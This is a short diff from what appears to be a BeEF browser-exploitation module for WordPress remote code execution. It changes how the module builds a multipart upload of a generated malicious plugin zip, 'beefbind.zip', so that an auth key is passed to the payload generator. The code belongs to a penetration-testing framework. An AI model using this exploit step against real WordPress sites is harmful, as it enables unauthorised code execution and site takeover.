@@ -41,7 +41,7 @@ beef.execute(function() {
     post_data += "filename=\"beefbind.zip\"\r\n";
     post_data += "Content-Type: application/octet-stream\r\n";
     post_data += "\r\n";
-    post_data += "<%= Wordpress_upload_rce_plugin.generate_zip_payload %>";
+    post_data += "<%= Wordpress_upload_rce_plugin.generate_zip_payload(@auth_key) %>";
     post_data += "\r\n";
     post_data += "--" + boundary + "--\r\n"
 
